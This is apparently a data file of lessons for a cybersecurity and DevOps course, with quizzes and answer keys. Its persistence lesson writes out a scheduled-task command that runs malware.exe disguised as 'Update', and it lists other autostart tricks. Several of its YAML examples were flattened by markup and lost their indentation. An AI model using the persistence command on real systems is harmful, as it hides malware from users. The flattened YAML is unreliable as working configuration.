<p><strong>Lessons:</strong></p>
<ul>
<li>Trust no software blindly — even from trusted vendors</li>
<li>Monitor outbound DNS and network traffic for anomalies</li>
<li>Verify software integrity (build reproducibility, code signing reviews)</li>
<li>Assume breach — have detection for post-compromise activity</li>
</ul>`
      }
    ]
  },

  115: {
    titleEn: "Malware & Persistence",
    pages: [
      {
        titleEn: "Malware Types",
        contentEn: `<p><strong>Malware</strong> = malicious software designed to harm, exploit, or steal.</p>

<p><strong>Types of malware:</strong></p>

<p><strong>Virus</strong></p>
<ul>
<li>Attaches to legitimate files/programs</li>
<li>Spreads when the infected file is opened or shared</li>
<li>Needs human action to spread (opening a file, running a program)</li>
</ul>

<p><strong>Worm</strong></p>
<ul>
<li>Spreads by itself across networks — no human action needed</li>
<li>Exploits vulnerabilities to move from system to system</li>
<li>Example: WannaCry (2017) — used EternalBlue to spread via SMB, infected 230,000+ computers in 150 countries</li>
</ul>

<p><strong>Trojan</strong></p>
<ul>
<li>Looks like legitimate software but contains malicious code</li>
<li>User installs it willingly (fake antivirus, pirated game)</li>
<li>Does not self-replicate — relies on deception</li>
</ul>

<p><strong>Ransomware</strong></p>
<ul>
<li>Encrypts your files and demands payment (usually Bitcoin) for the decryption key</li>
<li>Modern variants also steal data first (double extortion)</li>
<li>Example: REvil demanded $70 million from Kaseya victims (2021)</li>
</ul>

<p><strong>Rootkit</strong></p>
<ul>
<li>Hides deep in the operating system (kernel level)</li>
<li>Makes itself and other malware invisible to antivirus</li>
<li>Very difficult to detect and remove — often requires OS reinstall</li>
<li>Can survive reboots and some can survive OS reinstall (firmware rootkits)</li>
</ul>

<p><strong>Other types:</strong></p>
<ul>
<li><strong>Spyware</strong> — monitors user activity (keylogger, screen capture)</li>
<li><strong>Adware</strong> — displays unwanted ads, tracks browsing</li>
<li><strong>Botnet</strong> — network of infected computers controlled by attacker (used for DDoS)</li>
</ul>`
      },
      {
        titleEn: "Persistence Mechanisms",
        contentEn: `<p><strong>Persistence</strong> = how malware survives a reboot and stays on the system.</p>

<p>Attackers need persistence to maintain access. Here are common techniques:</p>

<p><strong>1. Registry Run Keys (Windows)</strong></p>
<ul>
<li>Add entries to auto-start on boot:</li>
</ul>
<pre><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
<p>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</p>
</code></pre>
<ul>
<li>Easy to detect but still widely used</li>
</ul>

<p><strong>2. Scheduled Tasks / Cron Jobs</strong></p>
<ul>
<li>Windows: <code>schtasks /create /tn "Update" /tr malware.exe /sc onlogon</code></li>
<li>Linux: add to <code>/etc/crontab</code> or user crontab</li>
<li>Can run at specific times or on specific events</li>
</ul>

<p><strong>3. Windows Services</strong></p>
<ul>
<li>Register malware as a Windows service → starts automatically</li>
<li>Services run with SYSTEM privileges (highest level)</li>
<li>Can be set to restart on failure</li>
</ul>

<p><strong>4. Startup Folders</strong></p>
<ul>
<li>Drop a shortcut or script in:</li>
</ul>
<pre><code>C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
</code></pre>

<p><strong>5. DLL Hijacking / Side-Loading</strong></p>
<ul>
<li>Place a malicious DLL in a folder where a legitimate program searches first</li>
<li>The program loads the malicious DLL instead of the real one</li>
</ul>

<p><strong>6. WMI Event Subscriptions (Windows)</strong></p>
<ul>
<li>Advanced: trigger malware on specific system events</li>
<li>Hard to detect — not visible in common startup locations</li>
</ul>

<p><strong>Detection:</strong></p>
<ul>
<li>Use <strong>Autoruns</strong> (Sysinternals) — shows all auto-start locations</li>
<li>Check scheduled tasks and services regularly</li>
<li>Monitor registry changes with SIEM</li>
<li>Use EDR (Endpoint Detection and Response) tools for real-time monitoring</li>
</ul>`
      }
    ]
  },

  // ========== DEVOPS TRACK (201-209) ==========
201: {
    titleEn: "Linux Fundamentals",
    pages: [
      {
        titleEn: "The Filesystem Hierarchy (FHS)",
        contentEn: `<p>Linux organizes everything in a single tree that starts at /.</p>

<p><strong>Key directories:</strong></p>
<ul>
<li><strong>/bin</strong> — essential commands (ls, cp, cat)</li>
<li><strong>/etc</strong> — configuration files (like the "settings folder")</li>
<li><strong>/home</strong> — each user gets a folder here (/home/alice)</li>
<li><strong>/var</strong> — variable data: logs, databases, mail</li>
<li><strong>/tmp</strong> — temporary files (cleared on reboot)</li>
<li><strong>/usr</strong> — user programs and libraries</li>
<li><strong>/dev</strong> — device files (disks, terminals)</li>
<li><strong>/proc</strong> — virtual filesystem showing running processes</li>
</ul>

<p><strong>The big idea:</strong> In Linux, everything is a file.</p>
<p>A hard disk? A file (/dev/sda).</p>
<p>A running process? A folder (/proc/1234).</p>
<p>A network socket? Also a file.</p>

<p>This is very different from Windows, where drives have letters (C:\\, D:\\) and settings live in the Registry.</p>`
      },
      {
        titleEn: "Essential Linux Commands",
        contentEn: `<p>Every DevOps engineer uses these commands daily.</p>

<p><strong>System monitoring:</strong></p>
<ul>
<li><strong>top</strong> / <strong>htop</strong> — see CPU and memory usage live</li>
<li><strong>df -h</strong> — show disk space ("disk free, human-readable")</li>
<li><strong>free -h</strong> — show RAM usage</li>
</ul>

<p><strong>Network:</strong></p>
<ul>
<li><strong>ss -tulnp</strong> — show open ports and which process uses them</li>
<li><strong>curl</strong> — make HTTP requests from the terminal</li>
</ul>

<p><strong>Logs and debugging:</strong></p>
<ul>
<li><strong>journalctl -u nginx</strong> — read logs for a specific service</li>
<li><strong>journalctl -f</strong> — follow logs in real time (like a live stream)</li>
<li><strong>lsof -i :8080</strong> — find which process uses port 8080</li>
</ul>

<p><strong>File operations:</strong></p>
<ul>
<li><strong>grep -r "error" /var/log/</strong> — search for "error" in all log files</li>
<li><strong>tail -f /var/log/syslog</strong> — watch a log file live</li>
<li><strong>find / -name "*.conf"</strong> — find all config files</li>
</ul>

<p>> A good DevOps engineer does not guess. They check logs first.</p>`
      },
      {
        titleEn: "Permissions: chmod and chown",
        contentEn: `<p>Linux controls who can read, write, or run each file.</p>

<p><strong>Three permission groups:</strong></p>
<ul>
<li><strong>Owner</strong> — the user who created the file</li>
<li><strong>Group</strong> — a team of users</li>
<li><strong>Others</strong> — everyone else</li>
</ul>

<p><strong>Three permission types:</strong></p>
<ul>
<li><strong>r</strong> (read = 4) — can open and read</li>
<li><strong>w</strong> (write = 2) — can change or delete</li>
<li><strong>x</strong> (execute = 1) — can run as a program</li>
</ul>

<p><strong>Reading permissions:</strong></p>
<p><code>-rwxr-xr--</code> means:</p>
<ul>
<li>Owner: rwx (read + write + execute = 7)</li>
<li>Group: r-x (read + execute = 5)</li>
<li>Others: r-- (read only = 4)</li>
</ul>

<p><strong>Commands:</strong></p>
<ul>
<li><code>chmod 755 script.sh</code> — owner can do all, others can read and run</li>
<li><code>chmod 600 secret.key</code> — only owner can read and write</li>
<li><code>chown alice:devteam file.txt</code> — change owner to alice, group to devteam</li>
</ul>

{question}
<p>A file has permissions <code>-rw-r-----</code>. Who can read it?</p>
<p>a) Everyone on the system</p>
<p>b) Only the owner and the group</p>
<p>c) Only the owner</p>
<p>d) Nobody</p>

<p>answer: b</p>
<p>explanation: Owner has rw- (read+write), Group has r-- (read only), Others have --- (no access).</p>`
      },
      {
        titleEn: "systemd: Managing Services",
        contentEn: `<p>systemd is the boss of all processes on modern Linux.</p>

<p><strong>What is a service?</strong></p>
<p>A program that runs in the background. Examples: a web server (nginx), a database (postgres), your own app.</p>

<p><strong>Essential commands:</strong></p>
<ul>
<li><code>systemctl start nginx</code> — start the service</li>
<li><code>systemctl stop nginx</code> — stop the service</li>
<li><code>systemctl restart nginx</code> — stop then start</li>
<li><code>systemctl status nginx</code> — is it running? any errors?</li>
<li><code>systemctl enable nginx</code> — start automatically on boot</li>
<li><code>systemctl disable nginx</code> — do not start on boot</li>
</ul>

<p><strong>Creating your own service:</strong></p>
<pre><code>ini
<p># /etc/systemd/system/myapp.service</p>
<p>[Unit]</p>
<p>Description=My Application</p>
<p>After=network.target</p>

<p>[Service]</p>
<p>ExecStart=/usr/bin/python3 /opt/myapp/server.py</p>
<p>Restart=always</p>
<p>User=appuser</p>

<p>[Install]</p>
<p>WantedBy=multi-user.target</p>
</code></pre>

<p><strong>Key idea:</strong> <code>Restart=always</code> means if your app crashes, systemd will restart it automatically. This is self-healing at the OS level.</p>

{simulation}
<p>Your web app is not responding. Walk through the debugging steps:</p>
<ol>
<li><code>systemctl status myapp</code> — is the service running?</li>
<li><code>journalctl -u myapp -n 50</code> — what do the last 50 log lines say?</li>
<li><code>ss -tulnp | grep 8080</code> — is something blocking the port?</li>
<li><code>df -h</code> — is the disk full?</li>
<li><code>free -h</code> — is the system out of memory?</li>
</ol>`
      }
    ]
  },

  202: {
    titleEn: "Containers & Docker",
    pages: [
      {
        titleEn: "VMs vs Containers",
        contentEn: `<p>Both VMs and containers isolate applications, but in very different ways.</p>

<p><strong>Virtual Machine (VM):</strong></p>
<ul>
<li>Runs a full operating system inside your OS</li>
<li>Has its own kernel, drivers, and libraries</li>
<li>Heavyweight: takes minutes to start, uses GBs of RAM</li>
<li>Example: VirtualBox, VMware, EC2 instances</li>
</ul>

<p><strong>Container:</strong></p>
<ul>
<li>Shares the host OS kernel</li>
<li>Only packs the app + its dependencies</li>
<li>Lightweight: starts in seconds, uses MBs of RAM</li>
<li>Example: Docker containers</li>
</ul>

<p><strong>Analogy:</strong></p>
<ul>
<li>A VM is like renting an entire apartment (your own kitchen, bathroom, walls)</li>
<li>A container is like a co-working desk (shared building, your own space)</li>
</ul>

<p><strong>Why containers won:</strong></p>
<ul>
<li>10x faster startup</li>
<li>10x less disk and memory usage</li>
<li>Easy to move between machines (works on my laptop = works on the server)</li>
<li>Perfect for microservices (one container per service)</li>
</ul>

<table>
<thead><tr><th>Feature</th><th>VM</th><th>Container</th></tr></thead>
<tbody>
<tr><td>Startup time</td><td>Minutes</td><td>Seconds</td></tr>
<tr><td>Size</td><td>GBs</td><td>MBs</td></tr>
<tr><td>Isolation</td><td>Full OS</td><td>Process-level</td></tr>
<tr><td>Performance</td><td>Some overhead</td><td>Near-native</td></tr>
</tbody></table>`
      },
      {
        titleEn: "Dockerfile: Building Images",
        contentEn: `<p>A Dockerfile is a recipe that tells Docker how to build an image.</p>

<p><strong>Key instructions:</strong></p>
<ul>
<li><strong>FROM</strong> — the base image to start from</li>
<li><strong>RUN</strong> — execute a command during build</li>
<li><strong>COPY</strong> — copy files from your machine into the image</li>
<li><strong>CMD</strong> — the default command when the container starts</li>
<li><strong>EXPOSE</strong> — document which port the app uses</li>
<li><strong>ENV</strong> — set environment variables</li>
</ul>

<p><strong>Example:</strong></p>
<pre><code>dockerfile
<p>FROM node:20-alpine</p>
<p>WORKDIR /app</p>
<p>COPY package*.json ./</p>
<p>RUN npm install</p>
<p>COPY . .</p>
<p>EXPOSE 3000</p>
<p>CMD ["node", "server.js"]</p>
</code></pre>

<p><strong>How layers work:</strong></p>
<p>Each instruction creates a layer. Docker caches layers.</p>
<p>If you change your code but not package.json, Docker skips the <code>npm install</code> layer. This makes builds fast.</p>

<p><strong>Layer order matters:</strong></p>
<ul>
<li>Put things that change rarely at the top (FROM, package.json)</li>
<li>Put things that change often at the bottom (COPY source code)</li>
</ul>

<p><strong>Build and run:</strong></p>
<pre><code>bash
<p>docker build -t myapp:1.0 .</p>
<p>docker run -p 3000:3000 myapp:1.0</p>
</code></pre>

{question}
<p>Why do we COPY package.json before COPY . (the full source)?</p>
<p>a) It does not matter, the order is random</p>
<p>b) So Docker can cache the npm install layer when only code changes</p>
<p>c) Because package.json must be copied first by law</p>
<p>d) To make the image smaller</p>

<p>answer: b</p>
<p>explanation: Docker caches each layer. If package.json did not change, the RUN npm install layer is reused. This saves minutes on every build.</p>`
      },
      {
        titleEn: "Docker Compose: Multi-Container Apps",
        contentEn: `<p>Most real apps need more than one container. Docker Compose manages them all.</p>

<p><strong>Example: web app + database + cache</strong></p>
<pre><code>yaml
<p># docker-compose.yml</p>
<p>version: "3.8"</p>
<p>services:</p>
<p>web:</p>
<p>build: .</p>
<p>ports:</p>
<ul>
<li>"3000:3000"</li>
</ul>
<p>environment:</p>
<ul>
<li>DB_HOST=db</li>
<li>REDIS_HOST=cache</li>
</ul>
<p>depends_on:</p>
<ul>
<li>db</li>
<li>cache</li>
</ul>

<p>db:</p>
<p>image: postgres:15</p>
<p>environment:</p>
<p>POSTGRES_PASSWORD: secret</p>
<p>volumes:</p>
<ul>
<li>pgdata:/var/lib/postgresql/data</li>
</ul>

<p>cache:</p>
<p>image: redis:7-alpine</p>

<p>volumes:</p>
<p>pgdata:</p>
</code></pre>

<p><strong>Key concepts:</strong></p>
<ul>
<li><strong>services</strong> — each service is one container</li>
<li><strong>depends_on</strong> — start db and cache before web</li>
<li><strong>volumes</strong> — pgdata keeps database files safe even if the container is deleted</li>
<li><strong>environment</strong> — pass config without hardcoding</li>
</ul>

<p><strong>Commands:</strong></p>
<ul>
<li><code>docker compose up -d</code> — start all services in background</li>
<li><code>docker compose down</code> — stop and remove all containers</li>
<li><code>docker compose logs -f web</code> — follow logs of the web service</li>
<li><code>docker compose ps</code> — list running services</li>
</ul>

<p><strong>Why Compose matters:</strong> One command to start your entire application stack. New developer? Clone the repo, run <code>docker compose up</code>, done.</p>`
      },
      {
        titleEn: "Docker Networking",
        contentEn: `<p>Containers need to talk to each other and to the outside world. Docker provides three network types.</p>

<p><strong>Bridge (default):</strong></p>
<ul>
<li>Containers on the same bridge network can reach each other by name</li>
<li>Isolated from the host and from other networks</li>
<li>Best for: single-machine apps, development</li>
</ul>

<p><strong>Host:</strong></p>
<ul>
<li>Container shares the host's network directly</li>
<li>No port mapping needed (the container IS the host, network-wise)</li>
<li>Best for: maximum performance, monitoring tools</li>
</ul>

<p><strong>Overlay:</strong></p>
<ul>
<li>Connects containers across multiple machines</li>
<li>Used in Docker Swarm and Kubernetes</li>
<li>Best for: production clusters</li>
</ul>

<p><strong>How containers find each other:</strong></p>
<pre><code>yaml
<p># In docker-compose.yml, services talk by name:</p>
<p>web:</p>
<p>environment:</p>
<ul>
<li>DB_HOST=db    # "db" resolves to the db container's IP</li>
</ul>
</code></pre>

<p>Docker runs its own internal DNS. When the web container asks for "db", Docker returns the IP of the database container.</p>

{thinkOutside}
<p>You have three microservices: API, Worker, and Database.</p>
<ul>
<li>The API must be reachable from the internet (port 8080)</li>
<li>The Worker processes background jobs and talks to the Database</li>
<li>The Database must NOT be reachable from the internet</li>
</ul>

<p>How would you design the Docker networks?</p>

<p>Hint: You can create multiple networks. A container can join more than one network.</p>

<p>Possible solution:</p>
<ul>
<li>Network "frontend": API container (exposed port 8080)</li>
<li>Network "backend": API + Worker + Database</li>
<li>The API is on both networks. The Database is only on "backend", so the internet cannot reach it directly.</li>
</ul>`
      }
    ]
  },

  203: {
    titleEn: "Kubernetes (K8s) Basics",
    pages: [
      {
        titleEn: "Core K8s Objects",
        contentEn: `<p>Kubernetes manages containers at scale. It uses objects to describe what you want.</p>

<p><strong>Pod:</strong></p>
<ul>
<li>The smallest unit in K8s</li>
<li>Contains one or more containers that share storage and network</li>
<li>Usually: one main container per Pod</li>
<li>Pods are temporary — they can be killed and recreated</li>
</ul>

<p><strong>Deployment:</strong></p>
<ul>
<li>Manages a set of identical Pods</li>
<li>You say "I want 3 copies", K8s keeps 3 running at all times</li>
<li>Handles rolling updates: replace old version with new, one by one</li>
</ul>

<p><strong>Service:</strong></p>
<ul>
<li>A stable network address for a group of Pods</li>
<li>Pods change IPs when they restart. A Service gives them a fixed name.</li>
<li>Types: ClusterIP (internal), NodePort (external port), LoadBalancer (cloud LB)</li>
</ul>

<p><strong>ConfigMap:</strong></p>
<ul>
<li>Stores configuration as key-value pairs</li>
<li>Keeps config outside your container image</li>
<li>Example: database URL, feature flags</li>
</ul>

<p><strong>Secret:</strong></p>
<ul>
<li>Like ConfigMap but for sensitive data</li>
<li>Base64 encoded (not encrypted by default!)</li>
<li>Example: passwords, API keys, TLS certificates</li>
</ul>

<p><strong>Mental model:</strong> A Deployment creates Pods. A Service gives them a stable address. ConfigMaps and Secrets feed them configuration.</p>`
      },
      {
        titleEn: "YAML & kubectl",
        contentEn: `<p>You describe your desired state in YAML files. K8s makes it happen.</p>

<p><strong>Example Deployment:</strong></p>
<pre><code>yaml
<p>apiVersion: apps/v1</p>
<p>kind: Deployment</p>
<p>metadata:</p>
<p>name: web-app</p>
<p>spec:</p>
<p>replicas: 3</p>
<p>selector:</p>
<p>matchLabels:</p>
<p>app: web</p>
<p>template:</p>
<p>metadata:</p>
<p>labels:</p>
<p>app: web</p>
<p>spec:</p>
<p>containers:</p>
<ul>
<li>name: web</li>
</ul>
<p>image: myapp:2.0</p>
<p>ports:</p>
<ul>
<li>containerPort: 3000</li>
</ul>
<p>resources:</p>
<p>requests:</p>
<p>memory: "128Mi"</p>
<p>cpu: "250m"</p>
<p>limits:</p>
<p>memory: "256Mi"</p>
<p>cpu: "500m"</p>
</code></pre>

<p><strong>Essential kubectl commands:</strong></p>
<ul>
<li><code>kubectl apply -f deploy.yaml</code> — create or update resources</li>
<li><code>kubectl get pods</code> — list all pods</li>
<li><code>kubectl describe pod web-app-xyz</code> — detailed info about a pod</li>
<li><code>kubectl logs web-app-xyz</code> — read pod logs</li>
<li><code>kubectl exec -it web-app-xyz -- /bin/sh</code> — open a shell inside a pod</li>
<li><code>kubectl delete -f deploy.yaml</code> — remove resources</li>
</ul>

<p><strong>Declarative vs Imperative:</strong></p>
<ul>
<li>Imperative: "Create 3 pods now" (like giving step-by-step orders)</li>
<li>Declarative: "I want 3 pods" (K8s figures out how to get there)</li>
<li>K8s is declarative. You describe the end state, not the steps.</li>
</ul>

{question}
<p>A Deployment has replicas: 3 and one pod crashes. What happens?</p>
<p>a) The app goes down until you manually fix it</p>
<p>b) K8s automatically creates a new pod to replace it</p>
<p>c) K8s shuts down the other 2 pods</p>
<p>d) Nothing, you need to run kubectl restart</p>

<p>answer: b</p>
<p>explanation: The Deployment controller always works to match the desired state (3 replicas). If a pod dies, it creates a new one.</p>`
      },
      {
        titleEn: "Horizontal Pod Autoscaler (HPA)",
        contentEn: `<p>HPA automatically adjusts the number of pods based on load.</p>

<p><strong>How it works:</strong></p>
<ol>
<li>You define: "keep CPU usage around 50%"</li>
<li>HPA checks metrics every 15 seconds</li>
<li>If average CPU > 50% → add more pods</li>
<li>If average CPU < 50% → remove extra pods</li>
</ol>

<p><strong>Example:</strong></p>
<pre><code>yaml
<p>apiVersion: autoscaling/v2</p>
<p>kind: HorizontalPodAutoscaler</p>
<p>metadata:</p>
<p>name: web-hpa</p>
<p>spec:</p>
<p>scaleTargetRef:</p>
<p>apiVersion: apps/v1</p>
<p>kind: Deployment</p>
<p>name: web-app</p>
<p>minReplicas: 2</p>
<p>maxReplicas: 10</p>
<p>metrics:</p>
<ul>
<li>type: Resource</li>
</ul>
<p>resource:</p>
<p>name: cpu</p>
<p>target:</p>
<p>type: Utilization</p>
<p>averageUtilization: 50</p>
</code></pre>

<p><strong>Key settings:</strong></p>
<ul>
<li><strong>minReplicas: 2</strong> — never go below 2 (high availability)</li>
<li><strong>maxReplicas: 10</strong> — never go above 10 (cost control)</li>
<li><strong>averageUtilization: 50</strong> — target 50% CPU usage</li>
</ul>

<p><strong>Scale-up vs scale-down:</strong></p>
<ul>
<li>Scale-up is fast (seconds) — respond to traffic spikes quickly</li>
<li>Scale-down is slow (5 minutes default) — avoid flapping</li>
</ul>

<p><strong>Real example:</strong></p>
<p>Normal load → 2 pods at 30% CPU.</p>
<p>Black Friday sale → CPU jumps to 80%.</p>
<p>HPA scales to 5 pods → CPU drops to 32%.</p>
<p>Sale ends → HPA slowly scales back to 2 pods.</p>

<p>This is why cloud-native apps can handle traffic spikes without human intervention.</p>`
      },
      {
        titleEn: "K8s Networking",
        contentEn: `<p>Kubernetes networking has three layers: pod-to-pod, services, and external access.</p>

<p><strong>CNI (Container Network Interface):</strong></p>
<ul>
<li>A plugin that gives each pod its own IP address</li>
<li>Popular choices: Calico, Flannel, Cilium</li>
<li>Rule: every pod can talk to every other pod (by default)</li>
</ul>

<p><strong>CoreDNS:</strong></p>
<ul>
<li>The internal DNS server of K8s</li>
<li>Lets pods find services by name</li>
<li><code>my-service.my-namespace.svc.cluster.local</code> → the service IP</li>
<li>Short form works too: just <code>my-service</code> within the same namespace</li>
</ul>

<p><strong>Service types:</strong></p>
<ul>
<li><strong>ClusterIP</strong> — internal only (default). Other pods can reach it.</li>
<li><strong>NodePort</strong> — opens a port (30000-32767) on every node</li>
<li><strong>LoadBalancer</strong> — creates a cloud load balancer (AWS ALB, GCP LB)</li>
</ul>

<p><strong>Ingress:</strong></p>
<ul>
<li>Routes external HTTP traffic to internal services</li>
<li>Acts like a smart reverse proxy</li>
<li>Can route by path: /api → api-service, /web → web-service</li>
<li>Can route by domain: api.myapp.com → api-service</li>
<li>Handles TLS/SSL termination</li>
</ul>

<pre><code>yaml
<p>apiVersion: networking.k8s.io/v1</p>
<p>kind: Ingress</p>
<p>metadata:</p>
<p>name: my-ingress</p>
<p>spec:</p>
<p>rules:</p>
<ul>
<li>host: myapp.com</li>
</ul>
<p>http:</p>
<p>paths:</p>
<ul>
<li>path: /api</li>
</ul>
<p>pathType: Prefix</p>
<p>backend:</p>
<p>service:</p>
<p>name: api-service</p>
<p>port:</p>
<p>number: 8080</p>
</code></pre>

{simulation}
<p>Trace a user request through K8s networking:</p>
<ol>
<li>User types myapp.com/api/users in browser</li>
<li>DNS resolves myapp.com to the cloud load balancer IP</li>
<li>Load balancer sends traffic to a K8s node</li>
<li>Ingress controller sees /api and routes to api-service</li>
<li>api-service (ClusterIP) picks one of 3 healthy pods</li>
<li>The pod processes the request and returns a response</li>
<li>The response travels back the same path</li>
</ol>`
      }
    ]
  },

  204: {
    titleEn: "Cloud Computing",
    pages: [
      {
        titleEn: "Service Models: IaaS, PaaS, SaaS",
        contentEn: `<p>Cloud computing means renting computers over the internet instead of buying them.</p>

<p><strong>Three service models:</strong></p>

<p><strong>IaaS (Infrastructure as a Service):</strong></p>
<ul>
<li>You rent raw servers, storage, and networks</li>
<li>You manage: OS, runtime, app, data</li>
<li>The cloud manages: physical hardware, power, cooling</li>
<li>Example: AWS EC2, Google Compute Engine, Azure VMs</li>
<li>Analogy: renting an empty apartment — you bring your own furniture</li>
</ul>

<p><strong>PaaS (Platform as a Service):</strong></p>
<ul>
<li>You just deploy your code</li>
<li>The cloud manages: OS, runtime, scaling, updates</li>
<li>You manage: your app and its data</li>
<li>Example: Heroku, AWS Elastic Beanstalk, Google App Engine</li>
<li>Analogy: a hotel room — furniture included, just bring your clothes</li>
</ul>

<p><strong>SaaS (Software as a Service):</strong></p>
<ul>
<li>You use a finished product</li>
<li>The cloud manages everything</li>
<li>Example: Gmail, Slack, Salesforce</li>
<li>Analogy: going to a restaurant — just eat, no cooking</li>
</ul>

<table>
<thead><tr><th>You manage</th><th>IaaS</th><th>PaaS</th><th>SaaS</th></tr></thead>
<tbody>
<tr><td>Application</td><td>Yes</td><td>Yes</td><td>No</td></tr>
<tr><td>Runtime</td><td>Yes</td><td>No</td><td>No</td></tr>
<tr><td>OS</td><td>Yes</td><td>No</td><td>No</td></tr>
<tr><td>Hardware</td><td>No</td><td>No</td><td>No</td></tr>
</tbody></table>

<p><strong>How to choose:</strong></p>
<ul>
<li>Need full control? → IaaS</li>
<li>Want to focus on code? → PaaS</li>
<li>Just need to use software? → SaaS</li>
</ul>`
      },
      {
        titleEn: "AWS Core Services",
        contentEn: `<p>AWS is the largest cloud provider. These are the services you must know.</p>

<p><strong>Compute:</strong></p>
<ul>
<li><strong>EC2</strong> — virtual servers (IaaS). Choose CPU, RAM, disk. You manage the OS.</li>
<li><strong>Lambda</strong> — serverless functions. Upload code, pay per execution. No servers to manage.</li>
</ul>

<p><strong>Storage:</strong></p>
<ul>
<li><strong>S3</strong> — object storage. Store files, images, backups. Very cheap, very durable (99.999999999% — "eleven nines").</li>
<li><strong>EBS</strong> — block storage. Like a virtual hard disk attached to an EC2 instance.</li>
</ul>

<p><strong>Database:</strong></p>
<ul>
<li><strong>RDS</strong> — managed relational databases (PostgreSQL, MySQL). AWS handles backups, patches, failover.</li>
<li><strong>DynamoDB</strong> — managed NoSQL. Very fast, scales automatically.</li>
</ul>

<p><strong>Networking:</strong></p>
<ul>
<li><strong>VPC</strong> — your private network in the cloud</li>
<li><strong>Route 53</strong> — DNS service</li>
<li><strong>CloudFront</strong> — CDN (content delivery network)</li>
</ul>

<p><strong>The serverless shift:</strong></p>
<p>Traditional: EC2 + RDS + load balancer (you manage scaling)</p>
<p>Serverless: Lambda + DynamoDB + API Gateway (AWS manages scaling)</p>

{question}
<p>Your app gets 100 requests per day. Which is cheaper?</p>
<p>a) A t3.medium EC2 running 24/7 ($30/month)</p>
<p>b) Lambda functions ($0.0000002 per request)</p>
<p>c) Both cost the same</p>

<p>answer: b</p>
<p>explanation: 100 requests/day = 3,000/month. At $0.0000002 per request, that is $0.0006/month. The EC2 instance costs $30/month even when idle. Lambda wins for low-traffic apps.</p>`
      },
      {
        titleEn: "VPC Networking",
        contentEn: `<p>A VPC (Virtual Private Cloud) is your own private network inside AWS.</p>

<p><strong>Key components:</strong></p>
<ul>
<li><strong>Subnets</strong> — slices of your network</li>
<li>Public subnet: has a route to the internet (for web servers)</li>
<li>Private subnet: no direct internet access (for databases)</li>
<li><strong>Internet Gateway</strong> — the door to the internet</li>
<li><strong>NAT Gateway</strong> — lets private resources reach the internet (for updates) without being reachable from the internet</li>
<li><strong>Security Groups</strong> — firewall rules per resource (allow port 443 from anywhere, allow port 5432 only from the web server)</li>
<li><strong>Route Tables</strong> — traffic rules (this subnet goes to the internet gateway, that subnet goes to the NAT)</li>
</ul>

<p><strong>Typical architecture:</strong></p>
<pre><code>Internet
<p>|</p>
<p>Internet Gateway</p>
<p>|</p>
<p>[Public Subnet]</p>
<ul>
<li>Load Balancer</li>
<li>NAT Gateway</li>
</ul>
<p>|</p>
<p>[Private Subnet]</p>
<ul>
<li>Web servers (EC2)</li>
<li>API servers</li>
</ul>
<p>|</p>
<p>[Private Subnet]</p>
<ul>
<li>Database (RDS)</li>
<li>Cache (ElastiCache)</li>
</ul>
</code></pre>

<p><strong>Security layers:</strong></p>
<ol>
<li>Security Groups (instance level) — stateful firewall</li>
<li>Network ACLs (subnet level) — stateless firewall</li>
<li>Private subnets (network level) — no public IP at all</li>
</ol>

<p><strong>Rule of thumb:</strong> Put only load balancers in public subnets. Everything else goes in private subnets.</p>`
      },
      {
        titleEn: "High Availability & Chaos Engineering",
        contentEn: `<p>Cloud does not mean "never fails." It means "designed to survive failures."</p>

<p><strong>Multi-AZ (Availability Zones):</strong></p>
<ul>
<li>Each AWS region has 2-6 AZs</li>
<li>An AZ is a separate data center (own power, cooling, network)</li>
<li>Deploy your app across 2+ AZs</li>
<li>If one AZ goes down, the others keep running</li>
</ul>

<p><strong>Design rules:</strong></p>
<ul>
<li>Stateless servers (no data stored on the server itself)</li>
<li>Database replication across AZs (RDS Multi-AZ)</li>
<li>Load balancer distributes traffic to healthy instances</li>
<li>Auto Scaling Group replaces failed instances</li>
</ul>

<p><strong>The Netflix Chaos Monkey story:</strong></p>
<p>In 2011, Netflix moved to AWS. They asked: "What if servers randomly die?"</p>
<p>Instead of hoping it would not happen, they built Chaos Monkey — a tool that randomly kills production servers during business hours.</p>

<p>Why? Because:</p>
<ul>
<li>If your system survives random server deaths, it can survive real outages</li>
<li>Engineers are forced to build resilient systems</li>
<li>Problems are found on Tuesday at 2 PM (when everyone is awake), not Saturday at 3 AM</li>
</ul>

<p><strong>Chaos Monkey rules:</strong></p>
<ul>
<li>Only runs during business hours</li>
<li>Only kills one instance at a time</li>
<li>The team gets alerts and can see what happened</li>
</ul>

<p><strong>The result:</strong> When AWS had a major outage in 2012, Netflix stayed up while other companies went down. Their systems were trained to survive failure.</p>

{thinkOutside}
<p>Your company runs a web app on 2 EC2 instances in one AZ. The CEO says "we never had downtime, why pay for Multi-AZ?"</p>

<p>What is wrong with this thinking? What would you say to the CEO?</p>

<p>Key points:</p>
<ul>
<li>"We never had downtime" = we were lucky, not resilient</li>
<li>A single AZ failure takes down everything</li>
<li>The cost of Multi-AZ is small compared to the cost of hours of downtime</li>
<li>Netflix did not wait for failure — they practiced for it</li>
</ul>`
      }
    ]
  },

  205: {
    titleEn: "DevOps Philosophy & CI/CD",
    pages: [
      {
        titleEn: "What is DevOps?",
        contentEn: `<p>DevOps is a culture change, not just a set of tools.</p>

<p><strong>The old way (before DevOps):</strong></p>
<ul>
<li>Developers write code and throw it "over the wall" to Operations</li>
<li>Operations deploy it and deal with problems</li>
<li>Blame game: "It works on my machine!" vs "Your code crashed the server!"</li>
<li>Releases happen every few months. Each release is scary.</li>
</ul>

<p><strong>The DevOps way:</strong></p>
<ul>
<li>Dev and Ops work together as one team</li>
<li>"You build it, you run it" — developers are responsible for their code in production</li>
<li>Releases happen many times per day. Each release is small and safe.</li>
<li>Automation replaces manual work</li>
</ul>

<p><strong>The CALMS framework:</strong></p>
<ul>
<li><strong>C</strong>ulture — collaboration, shared responsibility, no blame</li>
<li><strong>A</strong>utomation — CI/CD, Infrastructure as Code, monitoring</li>
<li><strong>L</strong>ean — small batches, fast feedback, reduce waste</li>
<li><strong>M</strong>easurement — measure everything (deploy frequency, failure rate, recovery time)</li>
<li><strong>S</strong>haring — share knowledge, tools, and on-call duties</li>
</ul>

<p><strong>Key metrics (DORA):</strong></p>
<ul>
<li>Deployment frequency → how often you release</li>
<li>Lead time for changes → from commit to production</li>
<li>Change failure rate → % of releases that cause problems</li>
<li>Mean time to recovery (MTTR) → how fast you fix problems</li>
</ul>

